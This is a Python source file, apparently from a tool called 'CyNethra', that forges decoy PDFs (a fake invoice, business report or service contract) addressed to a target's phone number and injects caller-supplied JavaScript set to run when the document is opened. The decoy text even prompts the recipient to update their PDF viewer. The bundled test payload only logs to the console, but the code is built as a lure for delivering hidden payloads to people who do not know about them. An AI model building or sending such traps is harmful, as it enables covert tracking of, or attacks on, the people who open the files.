# -*- coding: utf-8 -*-
import os
import json
import uuid
from datetime import datetime
from reportlab.lib.pagesizes import letter
from reportlab.lib import colors
from reportlab.lib.units import inch
from reportlab.platypus import SimpleDocTemplate, Table, TableStyle, Paragraph, Spacer, Image
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.pdfgen import canvas

# ==============================================================================
# CONFIGURATION
# ==============================================================================
PDF_OUTPUT_DIR = "/root/CyNethra/pdf_output"
os.makedirs(PDF_OUTPUT_DIR, exist_ok=True)

# ==============================================================================
# PDF TEMPLATE STYLES
# ==============================================================================
def get_styles():
    styles = getSampleStyleSheet()
    styles.add(ParagraphStyle(
        name='CustomTitle',
        parent=styles['Heading1'],
        fontSize=24,
        textColor=colors.HexColor('#2c3e50'),
        spaceAfter=30
    ))
    styles.add(ParagraphStyle(
        name='CustomBody',
        parent=styles['Normal'],
        fontSize=11,
        leading=15,
        textColor=colors.HexColor('#34495e')
    ))
    styles.add(ParagraphStyle(
        name='CustomSmall',
        parent=styles['Normal'],
        fontSize=9,
        leading=12,
        textColor=colors.HexColor('#7f8c8d')
    ))
    return styles

# ==============================================================================
# PDF GENERATION FUNCTIONS
# ==============================================================================
def generate_intelligence_pdf(trap_id, config, js_payload, pdf_type="invoice"):
    """
    Generates a professional PDF with embedded JavaScript intelligence payload.
    
    Args:
        trap_id (str): Unique identifier for the trap
        config (dict): Trap configuration
        js_payload (str): JavaScript code to embed
        pdf_type (str): Type of document (invoice, report, contract)
    
    Returns:
        str: Path to the generated PDF
    """
    target_number = config.get("target", "Unknown")
    session_id = config.get("session_id", trap_id)
    
    # Define document metadata
    metadata = {
        'title': f'Document Preview - {target_number}',
        'author': 'CyNethra Intelligence',
        'subject': 'Business Document',
        'keywords': 'invoice, report, contract',
        'creator': 'CyNethra PDF Forge',
        'producer': 'ReportLab PDF Library'
    }
    
    # Create PDF document
    pdf_path = os.path.join(PDF_OUTPUT_DIR, f"{trap_id}.pdf")
    doc = SimpleDocTemplate(
        pdf_path,
        pagesize=letter,
        rightMargin=72,
        leftMargin=72,
        topMargin=72,
        bottomMargin=72
    )
    
    styles = get_styles()
    elements = []
    
    # Add document header
    if pdf_type == "invoice":
        elements.append(Paragraph("INVOICE", styles['CustomTitle']))
        elements.append(Paragraph(f"Invoice #{trap_id.upper()[:8]}", styles['CustomBody']))
        elements.append(Spacer(1, 0.5*inch))
        
        # Invoice details table
        invoice_data = [
            ['Billed To:', 'Target Client'],
            ['Phone:', target_number],
            ['Date:', datetime.now().strftime('%B %d, %Y')],
            ['Due Date:', (datetime.now() + __import__('datetime').timedelta(days=30)).strftime('%B %d, %Y')],
        ]
        t = Table(invoice_data, colWidths=[2*inch, 4*inch])
        t.setStyle(TableStyle([
            ('BACKGROUND', (0, 0), (-1, -1), colors.HexColor('#ecf0f1')),
            ('TEXTCOLOR', (0, 0), (-1, -1), colors.HexColor('#2c3e50')),
            ('ALIGN', (0, 0), (-1, -1), 'LEFT'),
            ('FONTNAME', (0, 0), (-1, -1), 'Helvetica'),
            ('FONTSIZE', (0, 0), (-1, -1), 10),
            ('BOTTOMPADDING', (0, 0), (-1, -1), 12),
            ('TOPPADDING', (0, 0), (-1, -1), 12),
        ]))
        elements.append(t)
        elements.append(Spacer(1, 0.5*inch))
        
        # Line items
        line_items = [
            ['Description', 'Qty', 'Rate', 'Amount'],
            ['Professional Consulting Services', '1', '$150.00', '$150.00'],
            ['Technical Implementation', '1', '$250.00', '$250.00'],
            ['Project Management', '1', '$100.00', '$100.00'],
            ['', '', 'Subtotal', '$500.00'],
            ['', '', 'Tax (10%)', '$50.00'],
            ['', '', 'Total Due', '$550.00'],
        ]
        t2 = Table(line_items, colWidths=[3*inch, 0.5*inch, 1.5*inch, 1.5*inch])
        t2.setStyle(TableStyle([
            ('BACKGROUND', (0, 0), (-1, 0), colors.HexColor('#2c3e50')),
            ('TEXTCOLOR', (0, 0), (-1, 0), colors.white),
            ('ALIGN', (0, 0), (-1, -1), 'LEFT'),
            ('FONTNAME', (0, 0), (-1, -1), 'Helvetica'),
            ('FONTSIZE', (0, 0), (-1, -1), 10),
            ('BOTTOMPADDING', (0, 0), (-1, -1), 10),
            ('TOPPADDING', (0, 0), (-1, -1), 10),
            ('LINEBELOW', (0, 0), (-1, 0), 2, colors.black),
            ('BACKGROUND', (0, 3), (-1, 3), colors.HexColor('#ecf0f1')),
            ('FONTNAME', (0, 3), (-1, 3), 'Helvetica-Bold'),
        ]))
        elements.append(t2)
        
    elif pdf_type == "report":
        elements.append(Paragraph("QUARTERLY BUSINESS REPORT", styles['CustomTitle']))
        elements.append(Paragraph(f"Reporting Period: Q{datetime.now().quarter} {datetime.now().year}", styles['CustomBody']))
        elements.append(Spacer(1, 0.3*inch))
        
        # Executive summary
        elements.append(Paragraph("Executive Summary", styles['Heading3']))
        elements.append(Paragraph(
            "This report provides a comprehensive overview of business performance, "
            "key metrics, and strategic recommendations for the upcoming period. "
            "All data has been verified and is ready for stakeholder review.",
            styles['CustomBody']
        ))
        elements.append(Spacer(1, 0.3*inch))
        
        # Key metrics table
        metrics_data = [
            ['Metric', 'Current', 'Previous', 'Change'],
            ['Revenue', '$125,000', '$110,000', '+13.6%'],
            ['Customer Count', '1,245', '1,180', '+5.5%'],
            ['Satisfaction Score', '4.7/5', '4.5/5', '+4.4%'],
            ['Churn Rate', '2.1%', '2.8%', '-25.0%'],
        ]
        t3 = Table(metrics_data, colWidths=[2*inch, 1.5*inch, 1.5*inch, 1.5*inch])
        t3.setStyle(TableStyle([
            ('BACKGROUND', (0, 0), (-1, 0), colors.HexColor('#2c3e50')),
            ('TEXTCOLOR', (0, 0), (-1, 0), colors.white),
            ('ALIGN', (0, 0), (-1, -1), 'LEFT'),
            ('FONTNAME', (0, 0), (-1, -1), 'Helvetica'),
            ('FONTSIZE', (0, 0), (-1, -1), 10),
            ('BOTTOMPADDING', (0, 0), (-1, -1), 10),
            ('TOPPADDING', (0, 0), (-1, -1), 10),
        ]))
        elements.append(t3)
        
    elif pdf_type == "contract":
        elements.append(Paragraph("SERVICE AGREEMENT", styles['CustomTitle']))
        elements.append(Paragraph("This Agreement is made and entered into as of the date last signed below.", styles['CustomBody']))
        elements.append(Spacer(1, 0.3*inch))
        
        # Parties
        elements.append(Paragraph("1. PARTIES", styles['Heading3']))
        elements.append(Paragraph(
            f"Between: Service Provider (\"Provider\")\n"
            f"And: Target Client ({target_number}) (\"Client\")",
            styles['CustomBody']
        ))
        elements.append(Spacer(1, 0.3*inch))
        
        # Terms
        elements.append(Paragraph("2. SCOPE OF SERVICES", styles['Heading3']))
        elements.append(Paragraph(
            "The Provider agrees to perform the services described herein in accordance "
            "with the terms and conditions set forth in this Agreement. The Client agrees "
            "to pay for the services rendered as specified in the payment schedule.",
            styles['CustomBody']
        ))
        elements.append(Spacer(1, 0.3*inch))
        
        # Signature block
        elements.append(Paragraph("3. SIGNATURES", styles['Heading3']))
        signature_data = [
            ['Provider:', 'Client:'],
            ['_______________________', '_______________________'],
            ['Name: ', 'Name: '],
            ['Date: ', 'Date: '],
        ]
        t4 = Table(signature_data, colWidths=[3*inch, 3*inch])
        t4.setStyle(TableStyle([
            ('ALIGN', (0, 0), (-1, -1), 'LEFT'),
            ('FONTNAME', (0, 0), (-1, -1), 'Helvetica'),
            ('FONTSIZE', (0, 0), (-1, -1), 10),
            ('BOTTOMPADDING', (0, 0), (-1, -1), 20),
            ('TOPPADDING', (0, 0), (-1, -1), 10),
        ]))
        elements.append(t4)
    
    else:
        # Default generic document
        elements.append(Paragraph("DOCUMENT PREVIEW", styles['CustomTitle']))
        elements.append(Paragraph(f"Document ID: {trap_id}", styles['CustomBody']))
        elements.append(Spacer(1, 0.3*inch))
        elements.append(Paragraph(
            "This is a professional document prepared for your review. "
            "Please ensure you have the latest version of your PDF viewer "
            "for optimal viewing experience.",
            styles['CustomBody']
        ))
    
    # Footer
    elements.append(Spacer(1, 1*inch))
    elements.append(Paragraph(
        f"Generated on {datetime.now().strftime('%B %d, %Y at %H:%M')} | "
        f"Confidential | Page 1 of 1",
        styles['CustomSmall']
    ))
    
    # Build PDF with embedded JavaScript
    # We use a custom canvas maker to inject JS
    class PDFCanvasMaker:
        def __init__(self, js_code, metadata):
            self.js_code = js_code
            self.metadata = metadata
        
        def __call__(self, *args, **kwargs):
            c = canvas.Canvas(*args, **kwargs)
            
            # Set metadata
            for key, value in self.metadata.items():
                c._doc.info.Add(key, value)
            
            # Embed JavaScript
            # The JavaScript will execute when the PDF is opened
            c._doc.Catalog.Dict['Names'] = {
                'JavaScript': {
                    'Names': [
                        ['OpenDocument', self.js_code]
                    ]
                }
            }
            
            return c
    
    # Build the document
    doc.build(elements, canvasmaker=PDFCanvasMaker(js_payload, metadata))
    
    print(f"[PDF FORGE] Generated: {pdf_path}")
    return pdf_path

# ==============================================================================
# MAIN FUNCTION
# ==============================================================================
def create_pdf_trap(trap_id, config, js_payload, pdf_type="invoice"):
    """
    Main entry point for PDF trap creation.
    
    Args:
        trap_id (str): Unique identifier
        config (dict): Trap configuration
        js_payload (str): JavaScript payload
        pdf_type (str): Type of PDF to generate
    
    Returns:
        dict: Result with PDF path and URL
    """
    try:
        pdf_path = generate_intelligence_pdf(trap_id, config, js_payload, pdf_type)
        
        # Calculate PDF size
        file_size = os.path.getsize(pdf_path)
        
        return {
            "pdf_path": pdf_path,
            "pdf_url": f"/pdf/{trap_id}.pdf",
            "pdf_size": file_size,
            "pdf_type": pdf_type,
            "status": "success"
        }
    
    except Exception as e:
        import traceback
        error_msg = traceback.format_exc()
        print(f"[PDF FORGE ERROR] {e}\n{error_msg}")
        return {
            "status": "error",
            "message": str(e),
            "traceback": error_msg
        }

# ==============================================================================
# TEST FUNCTION
# ==============================================================================
if __name__ == "__main__":
    # Test PDF generation
    test_config = {
        "target": "917997187999",
        "session_id": "test_001",
        "target_url": "https://youtube.com/shorts/miJC9CeDyp0"
    }
    
    test_js = """
    (function() {
        console.log("CyNethra PDF Payload Executed");
        console.log("Trap ID: test_001");
    })();
    """
    
    result = create_pdf_trap("test_001", test_config, test_js, "invoice")
    print(json.dumps(result, indent=2))
